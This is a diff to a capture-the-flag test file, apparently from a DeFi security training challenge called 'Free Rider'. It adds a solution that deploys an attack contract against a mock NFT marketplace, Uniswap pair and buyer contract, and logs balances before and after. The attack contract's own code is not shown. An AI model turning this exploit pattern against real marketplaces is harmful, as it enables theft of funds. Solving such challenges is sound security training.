@@ -105,6 +105,29 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const getStats = async () => {
+            console.log("Attacker balance (ETH):", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+            console.log("Buyer balance (ETH):", ethers.utils.formatEther(await ethers.provider.getBalance(buyer.address)));
+            console.log("Uniswap balance (WETH):", ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapPair.address)));
+            console.log("------------------------------------------------------------------------------------------------------");
+        };
+    
+        console.log("Initial state:");
+        await getStats();
+
+        const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);
+        const attackContract = await AttackFactory.deploy(
+            this.nft.address,
+            this.weth.address,
+            this.marketplace.address,
+            this.uniswapPair.address,
+            this.buyerContract.address
+        );
+
+        await attackContract.connect(attacker).attack(ethers.utils.parseEther("15"));  
+
+        console.log("\nAfter attack:");
+        await getStats();
     });
 
     after(async function () {
